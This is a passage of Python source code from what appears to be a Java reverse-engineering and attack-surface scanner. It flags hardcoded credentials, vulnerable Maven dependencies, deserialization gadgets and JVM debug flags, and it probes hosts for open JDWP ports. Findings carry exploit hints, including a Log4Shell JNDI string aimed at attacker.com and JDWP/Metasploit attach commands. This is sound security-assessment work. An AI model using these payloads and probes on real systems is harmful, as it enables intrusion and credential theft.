                manifest[current_key] = ''.join(current_val).strip()
            k, _, v = line.partition(':')
            current_key = k.strip()
            current_val = [v.strip()]
        else:
            if current_key:
                manifest[current_key] = ''.join(current_val).strip()
            current_key = None
            current_val = []
    if current_key:
        manifest[current_key] = ''.join(current_val).strip()
    return manifest


def _parse_pom_properties(content_bytes):
    """Parse META-INF/maven/.../pom.properties into a dep dict."""
    dep = {}
    for line in content_bytes.decode('utf-8', errors='replace').splitlines():
        line = line.strip()
        if line.startswith('#') or '=' not in line:
            continue
        k, _, v = line.partition('=')
        dep[k.strip()] = v.strip()
    return dep


def analyze_jar(jar_path):
    """Analyze all .class files in a JAR/WAR/EAR.

    Also extracts: MANIFEST.MF (Main-Class, Class-Path, Implementation-* headers),
    Maven pom.properties (groupId/artifactId/version for each bundled dep).

    Returns: dict with class_count, frameworks, dangerous_calls, security_strings,
             manifest, maven_deps, jndi_patterns, unprotected_endpoints, gadget_classes.
    """
    result = {
        'jar_path':             str(jar_path),
        'class_count':          0,
        'frameworks':           set(),
        'dangerous_calls':      [],
        'security_strings':     [],
        'classes':              [],
        'findings':             [],
        'manifest':             {},
        'maven_deps':           [],
        'jndi_patterns':        [],
        'unprotected_endpoints': [],
        'gadget_classes':       [],
        'jdbc_creds':           [],
        'spring_value_literals': [],
        'classloader_gadgets':  [],
        'lambda_gadgets':       [],
        'exception_swallows':   [],
        'reflection_chains':    [],
        'unsafe_ops':           [],
    }

    try:
        with zipfile.ZipFile(jar_path) as zf:
            entries = zf.namelist()

            # ── MANIFEST.MF ───────────────────────────────────────────────────
            if 'META-INF/MANIFEST.MF' in entries:
                try:
                    result['manifest'] = _parse_manifest(zf.read('META-INF/MANIFEST.MF'))
                except Exception:
                    pass

            # ── Maven pom.properties (dependency inventory) ───────────────────
            for entry in entries:
                if entry.endswith('pom.properties') and 'META-INF/maven/' in entry:
                    try:
                        dep = _parse_pom_properties(zf.read(entry))
                        if dep.get('groupId') and dep.get('artifactId'):
                            result['maven_deps'].append({
                                'groupId':    dep.get('groupId', ''),
                                'artifactId': dep.get('artifactId', ''),
                                'version':    dep.get('version', 'unknown'),
                                'pom_path':   entry,
                            })
                    except Exception:
                        pass

            # ── Gradle dependency hints from MANIFEST.MF headers ──────────────
            mf = result['manifest']
            # Gradle fat JARs sometimes embed build info
            for key in ('Implementation-Title', 'Implementation-Version',
                        'Built-By', 'Build-Jdk', 'Gradle-Version'):
                if key in mf:
                    pass  # surfaced via manifest dict already

            # ── Class file analysis ───────────────────────────────────────────
            class_entries = [n for n in entries if n.endswith('.class')]
            result['class_count'] = len(class_entries)

            for cname in class_entries[:200]:  # cap at 200 to avoid OOM
                try:
                    class_data = zf.read(cname)
                    parsed     = parse_class_file(class_data)
                    if 'error' in parsed:
                        continue

                    result['frameworks'].update(parsed['frameworks'])
                    result['dangerous_calls'].extend(parsed['dangerous_calls'])
                    result['security_strings'].extend(parsed['security_strings'])
                    result['jndi_patterns'].extend(parsed.get('jndi_patterns', []))
                    result['jdbc_creds'].extend(parsed.get('jdbc_creds', []))
                    result['spring_value_literals'].extend(parsed.get('spring_value_literals', []))
                    result['classloader_gadgets'].extend(parsed.get('classloader_gadgets', []))
                    result['lambda_gadgets'].extend(parsed.get('lambda_gadgets', []))
                    result['exception_swallows'].extend(parsed.get('exception_swallows', []))
                    result['reflection_chains'].extend(parsed.get('reflection_chains', []))
                    result['unsafe_ops'].extend(parsed.get('unsafe_ops', []))

                    if parsed.get('unprotected_endpoint'):
                        result['unprotected_endpoints'].append({
                            'class': parsed['class_name'],
                            'has_mvc': parsed['has_spring_mvc'],
                            'has_security': parsed['has_spring_security'],
                        })

                    if parsed.get('is_serializable') and parsed.get('gadget_methods'):
                        result['gadget_classes'].append({
                            'class':   parsed['class_name'],
                            'super':   parsed['super_name'],
                            'methods': parsed['gadget_methods'],
                        })

                    result['classes'].append({
                        'name':       parsed['class_name'],
                        'super':      parsed['super_name'],
                        'methods':    len(parsed['methods']),
                        'frameworks': parsed['frameworks'],
                    })
                except Exception:
                    pass

    except zipfile.BadZipFile:
        result['error'] = 'Not a valid ZIP/JAR file'
    except Exception as e:
        result['error'] = str(e)

    result['frameworks'] = list(result['frameworks'])
    return result


# ── Filesystem scan ───────────────────────────────────────────────────────────

JAVA_SEARCH_PATHS = [
    '/opt', '/srv', '/app', '/home',
    '/var/lib', '/usr/local/lib',
    '/usr/share/java',
]


def scan_java_artifacts(roots=None):
    """Find .class and .jar files on the filesystem.

    Returns: list of Path objects
    """
    roots = roots or JAVA_SEARCH_PATHS
    found = []

    for root in roots:
        p = Path(root)
        if not p.exists():
            continue
        try:
            for ext in ('*.class', '*.jar', '*.war', '*.ear'):
                found.extend(p.rglob(ext))
                if len(found) > 500:
                    return found[:500]
        except PermissionError:
            continue

    return found


# ── Findings synthesis ────────────────────────────────────────────────────────

CRED_TYPES = {'credential', 'secret', 'api_key', 'private_key', 'pem_key',
              'jwt_literal', 'credential_utf8', 'secret_utf8', 'api_key_utf8',
              'jwt_literal_utf8'}


def synthesize_findings(all_results):
    """Produce a ranked findings list from class/jar analysis results."""
    findings = []

    for r in all_results:
        src = r.get('jar_path') or r.get('class_name', '?')

        # Hardcoded credentials
        for s in r.get('security_strings', []):
            if s['type'] in CRED_TYPES:
                findings.append({
                    'type':     'HARDCODED_CREDENTIAL',
                    'severity': 'CRITICAL',
                    'source':   src,
                    'description': f'{s["type"]}: {s["value"][:60]}',
                    'detail':   f'constant pool index {s["cp_index"]}',
                    'exploit':  f'javap -verbose {src} | grep -A2 "#{s["cp_index"]}"',
                })

        # JDBC URLs with embedded credentials
        for c in r.get('jdbc_creds', []):
            findings.append({
                'type':     'JDBC_CREDENTIAL_EXPOSED',
                'severity': 'CRITICAL',
                'source':   src,
                'description': f'JDBC URL with embedded credentials: {c["value"][:100]}',
                'detail':   f'cp_index={c["cp_index"]}',
                'exploit':  'Extract JDBC URL; connect directly to DB — no app layer needed',
            })

        # JDBC URLs (no embedded creds — still interesting)
        for s in r.get('security_strings', []):
            if s['type'] == 'jdbc_url':
                findings.append({
                    'type':     'JDBC_URL_EXPOSED',
                    'severity': 'HIGH',
                    'source':   src,
                    'description': f'JDBC connection string in constant pool: {s["value"][:80]}',
                    'detail':   f'cp_index={s["cp_index"]}',
                    'exploit':  'Extract connection string and test direct DB access',
                })

        # Log4j JNDI patterns (Log4Shell indicator)
        if r.get('jndi_patterns'):
            findings.append({
                'type':     'LOG4SHELL_JNDI_PATTERN',
                'severity': 'CRITICAL',
                'source':   src,
                'description': (
                    f'{len(r["jndi_patterns"])} JNDI lookup pattern(s) in constant pool — '
                    'Log4Shell CVE-2021-44228 indicator'
                ),
                'detail':   r['jndi_patterns'][0]['value'][:100],
                'exploit':  'Inject ${jndi:ldap://attacker.com/a} in any logged field',
            })

        # Spring Security annotation gap (unprotected REST endpoints)
        for ep in r.get('unprotected_endpoints', []):
            findings.append({
                'type':     'UNPROTECTED_SPRING_ENDPOINT',
                'severity': 'HIGH',
                'source':   src,
                'description': (
                    f'Spring MVC endpoint class {ep["class"]} lacks @PreAuthorize/'
                    '@Secured/@RolesAllowed — authorization not enforced at method level'
                ),
                'detail':   'No Spring Security annotation found in this controller class',
                'exploit':  (
                    'Enumerate endpoints via Spring actuator /mappings or brute-force paths; '
                    'call without auth token'
                ),
            })

        # Deserialization gadget classes
        for gc in r.get('gadget_classes', []):
            findings.append({
                'type':     'DESERIAL_GADGET_CLASS',
                'severity': 'HIGH',
                'source':   src,
                'description': (
                    f'{gc["class"]} implements Serializable with '
                    f'gadget methods: {", ".join(gc["methods"])}'
                ),
                'detail':   f'super={gc["super"]}',
                'exploit':  (
                    'If this class is consumed by ObjectInputStream.readObject(), '
                    'craft ysoserial payload targeting this gadget chain'
                ),
            })

        # Spring @Value hardcoded literals
        for sv in r.get('spring_value_literals', []):
            findings.append({
                'type':     'SPRING_VALUE_HARDCODED',
                'severity': 'HIGH',
                'source':   src,
                'description': f'Spring @Value with hardcoded literal (not a placeholder): {sv["value"][:80]}',
                'detail':   f'cp_index={sv["cp_index"]}',
                'exploit':  'Extract literal from constant pool; value injected at Spring init time',
            })

        # Dangerous invocations
        for d in r.get('dangerous_calls', []):
            # Bump ObjectInputStream to CRITICAL
            sev = 'CRITICAL' if 'ObjectInputStream' in d['class'] else 'HIGH'
            findings.append({
                'type':     'DANGEROUS_INVOCATION',
                'severity': sev,
                'source':   src,
                'description': f'{d["class"]}.{d["method"]}() — code execution / deserialization vector',
                'detail':   'Trace controllable input to this call site',
                'exploit':  f'Find callers of {d["class"]}.{d["method"]} for injection point',
            })

        # JAR manifest — Main-Class (executable JAR = deployment surface)
        mc = r.get('manifest', {}).get('Main-Class')
        if mc:
            findings.append({
                'type':     'EXECUTABLE_JAR',
                'severity': 'INFO',
                'source':   src,
                'description': f'Executable JAR — Main-Class: {mc}',
                'detail':   f'Class-Path: {r["manifest"].get("Class-Path", "(none)")[:100]}',
                'exploit':  f'java -jar {src}',
            })

        # Maven dep inventory — flag vulnerable versions
        for dep in r.get('maven_deps', []):
            _flag_known_vuln_dep(dep, src, findings)

        # gRPC presence
        if 'grpc-java' in r.get('frameworks', []):
            findings.append({
                'type':     'GRPC_JAVA_SERVER',
                'severity': 'MEDIUM',
                'source':   src,
                'description': f'gRPC-Java service detected in {src}',
                'detail':   'BindableService or ServerInterceptor present',
                'exploit':  'Enumerate gRPC services with grpcurl, probe for unauth methods',
            })

        # ClassLoader gadgets (JLS Ch 12 §12.2)
        cl_gadgets = r.get('classloader_gadgets', [])
        if cl_gadgets:
            # Flag URLClassLoader separately — remote class load = RCE
            url_cl = [g for g in cl_gadgets if 'URLClassLoader' in g.get('class', '') + g.get('method', '')]
            if url_cl:
                findings.append({
                    'type':     'URLCLASSLOADER_REMOTE_LOAD',
                    'severity': 'CRITICAL',
                    'source':   src,
                    'description': (
                        f'URLClassLoader detected — remote class loading enables RCE '
                        f'if URL is attacker-controlled ({url_cl[0]["class"]}.{url_cl[0]["method"]})'
                    ),
                    'detail':   'JLS §12.2: ClassLoader.defineClass() from remote bytes',
                    'exploit':  (
                        'Host malicious .class at attacker URL; '
                        'trigger URLClassLoader instantiation with that URL'
                    ),
                })
            define_cl = [g for g in cl_gadgets if 'defineClass' in g.get('method', '') + g.get('class', '')]
            if define_cl:
                findings.append({
                    'type':     'CLASSLOADER_DEFINE_CLASS',
                    'severity': 'HIGH',
                    'source':   src,
                    'description': (
                        f'ClassLoader.defineClass() — arbitrary class definition from bytes '
                        f'({define_cl[0]["class"]}.{define_cl[0]["method"]})'
                    ),
                    'detail':   'JLS §12.2: class loading from attacker-supplied byte[]',
                    'exploit':  'Trace byte[] source; if user-controlled, supply crafted .class payload',
                })

        # Lambda deserialization gadgets (JLS Ch 9, 15)
        l_gadgets = r.get('lambda_gadgets', [])
        if l_gadgets:
            serial_lambda = [g for g in l_gadgets if 'SerializedLambda' in g.get('value', '')]
            if serial_lambda:
                findings.append({
                    'type':     'SERIALIZED_LAMBDA_GADGET',
                    'severity': 'HIGH',
                    'source':   src,
                    'description': (
                        'SerializedLambda present — Java 8+ lambda deserialization gadget; '
                        'reachable via ObjectInputStream when Serializable lambda is deserialized'
                    ),
                    'detail':   'JLS §9.8: functional interface serialization; lambda writeReplace hook',
                    'exploit':  'Craft ysoserial payload; chain through SerializedLambda.readResolve()',
                })
            lmf = [g for g in l_gadgets if 'LambdaMetafactory' in g.get('value', '')]
            if lmf:
                findings.append({
                    'type':     'LAMBDA_METAFACTORY_GADGET',
                    'severity': 'MEDIUM',
                    'source':   src,
                    'description': (
                        'LambdaMetafactory.metafactory() — dynamic method dispatch bootstrap; '
                        'appears in gadget chains targeting InvokeDynamic call sites'
                    ),
                    'detail':   'JLS §15.27.4: InvokeDynamic with attacker-controlled bootstrap args',
                    'exploit':  'Reference in marshalsec / ysoserial LambdaMetafactory gadget chain',
                })

        # Exception swallowing (JLS Ch 11 §11.2.3)
        ex_swallows = r.get('exception_swallows', [])
        if ex_swallows:
            findings.append({
                'type':     'EXCEPTION_SWALLOW',
                'severity': 'MEDIUM',
                'source':   src,
                'description': (
                    f'{len(ex_swallows)} broad catch(Throwable/Exception) clause(s) — '
                    'exception swallowing masks security failures and error conditions'
                ),
                'detail':   'JLS §11.2.3: catch(Throwable) captures Error subclasses; hides security exceptions',
                'exploit':  (
                    'Trigger SecurityException/AccessControlException; '
                    'confirm it is silently discarded rather than propagated'
                ),
            })

        # Reflection chains (JLS Ch 15 §15.12)
        ref_chains = r.get('reflection_chains', [])
        if ref_chains:
            setacc = [g for g in ref_chains if 'setAccessible' in g.get('method', '')]
            if setacc:
                findings.append({
                    'type':     'REFLECTION_ACCESS_BYPASS',
                    'severity': 'HIGH',
                    'source':   src,
                    'description': (
                        f'setAccessible(true) bypasses Java access control (JLS §6.6); '
                        f'enables reading/writing private/final fields ({setacc[0]["class"]})'
                    ),
                    'detail':   'JLS §15.12: AccessibleObject.setAccessible — no SecurityManager by default in JDK 17+',
                    'exploit':  'Chain with Field.set() or Method.invoke() to mutate private state',
                })
            constructor_refl = [g for g in ref_chains if 'Constructor' in g.get('class', '')]
            if constructor_refl:
                findings.append({
                    'type':     'REFLECTIVE_CONSTRUCTION',
                    'severity': 'MEDIUM',
                    'source':   src,
                    'description': (
                        'Constructor.newInstance() — reflective object construction; '
                        'bypasses normal initialization checks if combined with setAccessible'
                    ),
                    'detail':   'JLS §15.12.4: reflective constructor invocation',
                    'exploit':  'Combine with Unsafe.allocateInstance() in deserialization gadget chain',
                })

        # Unsafe operations (implementation-level)
        unsafe = r.get('unsafe_ops', [])
        if unsafe:
            alloc = [g for g in unsafe if 'allocateInstance' in g.get('method', '')]
            if alloc:
                findings.append({
                    'type':     'UNSAFE_ALLOCATE_INSTANCE',
                    'severity': 'HIGH',
                    'source':   src,
                    'description': (
                        f'sun.misc.Unsafe.allocateInstance() — allocates object without constructor; '
                        f'core deserialization gadget primitive ({alloc[0]["class"]})'
                    ),
                    'detail':   'Bypasses all constructor-based invariant enforcement; used in gadget chains',
                    'exploit':  'Appears in commons-collections, spring, and custom deserialization gadgets',
                })
            put_ops = [g for g in unsafe if any(
                m in g.get('method', '') for m in ('putObject', 'putLong', 'putInt', 'putReference')
            )]
            if put_ops:
                findings.append({
                    'type':     'UNSAFE_DIRECT_MEMORY_WRITE',
                    'severity': 'HIGH',
                    'source':   src,
                    'description': (
                        f'sun.misc.Unsafe.put*() — direct heap write bypassing field visibility; '
                        f'can overwrite final fields and object headers ({put_ops[0]["class"]})'
                    ),
                    'detail':   'Enables type confusion and field mutation without reflection overhead',
                    'exploit':  'Trace value argument source; attacker-controlled value = arbitrary write primitive',
                })

    # Deduplicate by type+source+description prefix
    seen = set()
    deduped = []
    for f in findings:
        key = (f['type'], f['source'], f['description'][:40])
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    return sorted(deduped, key=lambda x: {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}.get(x['severity'], 5))


# Known vulnerable version ranges for common Maven artifacts.
# Format: (groupId_prefix, artifactId, lambda version -> bool is_vuln, cve_note)
_KNOWN_VULN_DEPS = [
    ('org.apache.logging.log4j', 'log4j-core',
     lambda v: _version_lt(v, (2, 17, 1)),
     'CVE-2021-44228 Log4Shell (< 2.17.1)'),
    ('org.apache.struts', 'struts2-core',
     lambda v: _version_lt(v, (2, 5, 33)),
     'CVE-2017-5638 / CVE-2023-50164 (< 2.5.33)'),
    ('com.fasterxml.jackson.core', 'jackson-databind',
     lambda v: _version_lt(v, (2, 15, 0)),
     'CVE-2019-14379 polymorphic deserialization (< 2.15)'),
    ('org.springframework', 'spring-webmvc',
     lambda v: _version_lt(v, (5, 3, 20)),
     'CVE-2022-22965 Spring4Shell (< 5.3.20 / 5.2.x)'),
    ('org.apache.commons', 'commons-collections',
     lambda v: _version_lt(v, (3, 2, 2)),
     'CVE-2015-7501 deserialization gadget chain (< 3.2.2)'),
]


def _version_lt(version_str, threshold):
    """Return True if version_str < threshold tuple, False on parse error."""
    try:
        parts = tuple(int(x) for x in version_str.split('.')[:3])
        # Pad to 3-tuple
        while len(parts) < 3:
            parts += (0,)
        return parts < threshold
    except Exception:
        return False


def _flag_known_vuln_dep(dep, src, findings):
    """Check a Maven dep dict against known vulnerable version table."""
    g = dep.get('groupId', '')
    a = dep.get('artifactId', '')
    v = dep.get('version', '')
    for g_prefix, a_match, is_vuln_fn, cve_note in _KNOWN_VULN_DEPS:
        if g.startswith(g_prefix) and a == a_match:
            try:
                vuln = is_vuln_fn(v)
            except Exception:
                vuln = False
            if vuln:
                findings.append({
                    'type':     'VULNERABLE_DEPENDENCY',
                    'severity': 'CRITICAL',
                    'source':   src,
                    'description': f'{g}:{a}:{v} — {cve_note}',
                    'detail':   f'pom.properties: {dep.get("pom_path", "")}',
                    'exploit':  f'Target {a} at version {v}; apply vendor patch',
                })


# ── JLS-grounded scan helpers ─────────────────────────────────────────────────
#
# These operate on raw bytes (constant pool dump, decompiled text, or bytecode)
# rather than parsed .class structure — useful for quick grep-style scanning
# of strings extracted from JARs/class files outside the full parse pipeline.


def scan_classloader_gadgets(data: bytes) -> list:
    """Scan raw bytes for ClassLoader gadget surface (JLS Ch 12 §12.2).

    Covers:
      - ClassLoader.defineClass() — arbitrary class from byte[]
      - URLClassLoader — remote class loading RCE vector
      - Class.forName(name, initialize, loader) with explicit loader arg

    Args:
        data: raw bytes (constant pool strings, decompiled output, etc.)

    Returns:
        list of dicts with 'match' (bytes) and 'type' (str) keys
    """
    results = []
    seen = set()

    for m in _CLASSLOADER_RE.finditer(data):
        val = m.group()
        if val in seen:
            continue
        seen.add(val)

        match_str = val.decode('utf-8', errors='replace')
        if b'URLClassLoader' in val:
            gadget_type = 'url_classloader'
        elif b'defineClass' in val:
            gadget_type = 'define_class'
        elif b'loadClass' in val:
            gadget_type = 'load_class'
        else:
            gadget_type = 'classloader_ref'

        results.append({
            'match':  match_str,
            'type':   gadget_type,
            'offset': m.start(),
        })

    # Also flag URLClassLoader with http/ftp URL in surrounding context (64-byte window)
    _url_re = re.compile(rb'https?://[^\s\x00]{4,}|ftp://[^\s\x00]{4,}')
    if b'URLClassLoader' in data or b'url' in data.lower():
        for um in _url_re.finditer(data):
            url_val = um.group().decode('utf-8', errors='replace')
            results.append({
                'match':  url_val[:120],
                'type':   'remote_url_in_classloader_context',
                'offset': um.start(),
            })

    return results


def scan_reflection_chains(data: bytes) -> list:
    """Scan raw bytes for reflection chain primitives (JLS Ch 15 §15.12).

    Covers:
      - AccessibleObject.setAccessible(true) — access control bypass
      - Method.invoke(null, ...) — static method reflection
      - Constructor.newInstance() — reflective construction
      - Field.set(obj, value) — reflective field mutation / final bypass
      - MethodHandle.invoke / MethodHandles.lookup — MethodHandle API chain

    Args:
        data: raw bytes (constant pool strings, decompiled output, etc.)

    Returns:
        list of dicts with 'match', 'type', 'offset' keys
    """
    results = []
    seen = set()

    # Primary reflection chain pattern
    for m in _REFLECTION_CHAIN_RE.finditer(data):
        val = m.group()
        if val in seen:
            continue
        seen.add(val)

        match_str = val.decode('utf-8', errors='replace')
        if b'setAccessible' in val:
            chain_type = 'access_bypass'
        elif b'Constructor' in val:
            chain_type = 'reflective_construction'
        elif b'getDeclaredField' in val:
            chain_type = 'field_access'
        elif b'getDeclaredMethod' in val:
            chain_type = 'method_access'
        else:
            chain_type = 'reflection_ref'

        results.append({
            'match':  match_str,
            'type':   chain_type,
            'offset': m.start(),
        })

    # MethodHandle / lambda bootstrap patterns
    for m in _LAMBDA_GADGET_RE.finditer(data):
        val = m.group()
        if val in seen:
            continue
        seen.add(val)

        match_str = val.decode('utf-8', errors='replace')
        results.append({
            'match':  match_str,
            'type':   'method_handle_chain',
            'offset': m.start(),
        })

    # Unsafe reflection-equivalent ops
    for m in _UNSAFE_RE.finditer(data):
        val = m.group()
        if val in seen:
            continue
        seen.add(val)

        match_str = val.decode('utf-8', errors='replace')
        results.append({
            'match':  match_str,
            'type':   'unsafe_reflection_equiv',
            'offset': m.start(),
        })

    return results


# ── Main analyzer class ───────────────────────────────────────────────────────

class JavaREAnalyzer:
    """Java .class / .jar reverse engineering for Ablation."""

    def __init__(self, target_path=None):
        self.target_path = target_path
        self.findings    = []
        self._results    = []

    def analyze(self, path=None):
        """Analyze a single .class or .jar file.

        Returns: findings dict including all new detection fields.
        """
        p    = Path(path or self.target_path)
        data = p.read_bytes()

        if data[:4] == CAFEBABE:
            r = parse_class_file(data)
            r.setdefault('jar_path', None)
            self._results.append(r)
            findings = synthesize_findings([r])
        elif data[:4] in (b'PK\x03\x04', b'PK\x05\x06'):
            r = analyze_jar(p)
            self._results.append(r)
            findings = synthesize_findings([r])
        else:
            return {'error': f'Unknown format: {data[:4].hex()}'}

        self.findings.extend(findings)
        return {
            'path':                   str(p),
            'java_version':           r.get('java_version'),
            'class_count':            r.get('class_count', 1),
            'frameworks':             r.get('frameworks', []),
            'dangerous_calls':        r.get('dangerous_calls', []),
            'security_strings':       r.get('security_strings', []),
            'jndi_patterns':          r.get('jndi_patterns', []),
            'unprotected_endpoints':  r.get('unprotected_endpoints', []),
            'gadget_classes':         r.get('gadget_classes', []),
            'jdbc_creds':             r.get('jdbc_creds', []),
            'spring_value_literals':  r.get('spring_value_literals', []),
            'manifest':               r.get('manifest', {}),
            'maven_deps':             r.get('maven_deps', []),
            'classloader_gadgets':    r.get('classloader_gadgets', []),
            'lambda_gadgets':         r.get('lambda_gadgets', []),
            'exception_swallows':     r.get('exception_swallows', []),
            'reflection_chains':      r.get('reflection_chains', []),
            'unsafe_ops':             r.get('unsafe_ops', []),
            'findings':               findings,
        }

    def scan_system(self, roots=None):
        """Scan filesystem for Java artifacts and analyze all of them.

        Returns: list of findings across all artifacts
        """
        artifacts = scan_java_artifacts(roots)
        all_results = []

        for p in artifacts[:100]:  # cap at 100 artifacts
            try:
                data = p.read_bytes()
                if data[:4] == CAFEBABE:
                    r = parse_class_file(data)
                elif data[:4] in (b'PK\x03\x04', b'PK\x05\x06'):
                    r = analyze_jar(p)
                else:
                    continue
                r.setdefault('jar_path', str(p))
                all_results.append(r)
            except Exception:
                pass

        self.findings = synthesize_findings(all_results)
        self._results = all_results
        return self.findings

    def scan_for_class_files(self, roots=None):
        """Return list of class/jar paths (for compatibility with main.py)."""
        return scan_java_artifacts(roots)

    def report(self):
        lines = ['=' * 60, 'JAVA BINARY RE ANALYSIS', '=' * 60]

        if not self.findings:
            lines.append('No findings.')
            return '\n'.join(lines)

        crit  = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high  = [f for f in self.findings if f['severity'] == 'HIGH']
        med   = [f for f in self.findings if f['severity'] == 'MEDIUM']
        other = [f for f in self.findings if f['severity'] not in ('CRITICAL', 'HIGH', 'MEDIUM')]

        lines.append(
            f'\nFindings: {len(self.findings)} total '
            f'({len(crit)} CRITICAL, {len(high)} HIGH, {len(med)} MEDIUM)'
        )

        # Maven dep summary
        all_deps = []
        for r in self._results:
            all_deps.extend(r.get('maven_deps', []))
        if all_deps:
            lines.append(f'\nMaven dependencies bundled: {len(all_deps)}')
            for d in all_deps[:10]:
                lines.append(f'  {d["groupId"]}:{d["artifactId"]}:{d["version"]}')
            if len(all_deps) > 10:
                lines.append(f'  ... and {len(all_deps) - 10} more')

        # Manifest summary
        for r in self._results:
            mf = r.get('manifest', {})
            if mf.get('Main-Class'):
                lines.append(f'\nManifest Main-Class: {mf["Main-Class"]}')
                if mf.get('Class-Path'):
                    lines.append(f'  Class-Path: {mf["Class-Path"][:120]}')

        lines.append('')
        for f in crit + high + med + other:
            lines.append(f'[{f["severity"]}] {f["type"]} @ {f["source"][:50]}')
            lines.append(f'  {f["description"]}')
            if f.get('detail'):
                lines.append(f'  detail: {f["detail"][:120]}')
            if f.get('exploit'):
                lines.append(f'  EXPLOIT: {f["exploit"][:120]}')
            lines.append('')

        return '\n'.join(lines)


# ── JDWP Debug Port Detection ─────────────────────────────────────────────────
#
# Java Debug Wire Protocol (JDWP) — full JVM control when exposed:
#   - Heap read: read any object, field, variable in the running JVM
#   - Code evaluation: invoke arbitrary methods via VirtualMachine.executeMethod()
#   - Remote code exec: Runtime.getRuntime().exec("id") via ClassType.invokeMethod()
#   - No auth by default — if port is open, attacker has full JVM control
#
# Enabled by JVM launch flags:
#   -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
#   -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005
#   -agentlib:jdwp=...address=5005  (bind all interfaces — wildcard)
#
# JDWP handshake:
#   Client sends: b'JDWP-Handshake' (14 bytes)
#   Server echoes: b'JDWP-Handshake' (14 bytes) — confirms debug port open
#
# Cisco ISE (50% Java): Wildfly/JBoss app server — watch ports 5005, 8787, 9999
# Default JDWP ports: 5005, 5050, 8787, 9009, 9999, 14000

import socket as _socket

JDWP_HANDSHAKE = b'JDWP-Handshake'
JDWP_DEFAULT_PORTS = [5005, 5050, 8787, 9009, 9999, 14000, 4000, 4242]

JDWP_EXPLOIT_NOTE = (
    'JDWP open: full JVM control. PoC: '
    'jdb -attach {host}:{port}  OR  '
    'python -c "import socket; s=socket.create_connection((\'{host}\',{port})); '
    's.send(b\'JDWP-Handshake\'); print(s.recv(14))"  OR  '
    'use metasploit auxiliary/gather/jdwp_debugger_info + exploit/multi/misc/java_jdwp_debugger'
)

# JVM diagnostic flags that expose attack surface
JVM_ATTACK_FLAGS = {
    '-agentlib:jdwp':        ('CRITICAL', 'JDWP debug agent enabled — remote code exec'),
    '-Xrunjdwp':             ('CRITICAL', 'JDWP debug agent enabled (legacy flag) — remote code exec'),
    '-XX:+UnlockDiagnosticVMOptions': ('HIGH',   'Diagnostic options unlocked — internal heap/JIT exposure'),
    '-XX:+PrintCompilation': ('LOW',     'JIT compilation log enabled — info leak'),
    '-XX:+PrintAssembly':    ('MEDIUM',  'Assembly output enabled — JIT internals exposed'),
    'agentpath:':            ('HIGH',    'Native agent loaded — potential code injection surface'),
    '-Xdebug':               ('HIGH',    'Debug mode enabled — may enable JDWP attach'),
    '-XX:+HeapDumpOnOutOfMemoryError': ('MEDIUM', 'Heap dump on OOM — PII/secret exposure in dump file'),
    '-XX:HeapDumpPath=':     ('MEDIUM',  'Heap dump path configured — check for world-readable'),
    '-Djava.security.manager=': ('MEDIUM', 'Security manager config — verify policy not permissive'),
    '-Djavax.net.debug=':    ('LOW',     'SSL/TLS debug logging — credential/key material in logs'),
    'suspend=y':             ('HIGH',    'JDWP suspend=y — JVM halts until debugger attaches (DoS risk)'),
    'address=*:':            ('CRITICAL','JDWP bound to wildcard — accessible from all interfaces'),
}


def detect_debug_port(host: str, ports: list = None, timeout: float = 3.0) -> list:
    """
    Probe host for open JDWP debug ports.
    Sends the 14-byte JDWP handshake; server echo confirms debug port.

    Returns list of dicts: [{port, open, jdwp_confirmed, exploit_note}, ...]
    """
    if not ports:
        ports = JDWP_DEFAULT_PORTS

    results = []
    for port in ports:
        entry = {'port': port, 'open': False, 'jdwp_confirmed': False}
        try:
            s = _socket.create_connection((host, port), timeout=timeout)
            entry['open'] = True
            try:
                s.sendall(JDWP_HANDSHAKE)
                s.settimeout(timeout)
                resp = s.recv(32)
                if resp[:14] == JDWP_HANDSHAKE:
                    entry['jdwp_confirmed'] = True
                    entry['severity'] = 'CRITICAL'
                    entry['exploit_note'] = JDWP_EXPLOIT_NOTE.format(
                        host=host, port=port,
                    )
                else:
                    entry['banner'] = resp[:32].hex()
            except Exception as e:
                entry['probe_error'] = str(e)
            finally:
                s.close()
        except _socket.timeout:
            pass
        except ConnectionRefusedError:
            pass
        except Exception as e:
            entry['connect_error'] = str(e)

        if entry['open']:
            results.append(entry)

    return results


def analyze_jvm_flags(cmdline: str) -> list:
    """
    Parse a JVM command line string for dangerous/informational flags.
    Works on /proc/<pid>/cmdline content or ps output.

    Returns list of findings dicts.
    """
    findings = []
    seen = set()

    for flag, (severity, desc) in JVM_ATTACK_FLAGS.items():
        if flag.lower() in cmdline.lower():
            if flag in seen:
                continue
            seen.add(flag)

            # Extract port from jdwp address= clause
            port = None
            if 'jdwp' in flag.lower() or 'runjdwp' in flag.lower():
                m = re.search(r'address=(?:\*:)?(\d+)', cmdline, re.IGNORECASE)
                if m:
                    port = int(m.group(1))

            f = {
                'severity': severity,
                'type': 'JVM_FLAG',
                'flag': flag,
                'description': desc,
                'source': 'cmdline',
            }
            if port:
                f['jdwp_port'] = port
                f['exploit'] = f'jdb -attach {port}  OR  detect_debug_port(host, [{port}])'

            findings.append(f)

    # Extract all -D properties — may contain credentials
    env_props = re.findall(r'-D([\w\.]+)=([^\s]+)', cmdline)
    for key, val in env_props:
        if any(k in key.lower() for k in ['password', 'secret', 'token', 'credential', 'key', 'auth']):
            findings.append({
                'severity': 'HIGH',
                'type': 'JVM_CREDENTIAL_IN_CMDLINE',
                'flag': f'-D{key}',
                'description': f'Credential-like -D property in JVM cmdline: {key}={val[:40]}',
                'source': 'cmdline',
            })

    return findings


def scan_jvm_processes() -> list:
    """
    Read /proc/*/cmdline for running JVM processes and analyze flags.
    Returns combined findings list with process PID and command.
    """
    import glob

    all_findings = []
    for cmdline_path in glob.glob('/proc/*/cmdline'):
        try:
            pid = cmdline_path.split('/')[2]
            with open(cmdline_path, 'rb') as f:
                raw = f.read(4096)
            # /proc cmdline is null-separated
            cmdline = raw.replace(b'\x00', b' ').decode('utf-8', errors='replace')

            if 'java' not in cmdline.lower():
                continue

            findings = analyze_jvm_flags(cmdline)
            for finding in findings:
                finding['pid'] = pid
                finding['cmdline_excerpt'] = cmdline[:200]
            all_findings.extend(findings)

        except (PermissionError, FileNotFoundError):
            continue

    return all_findings


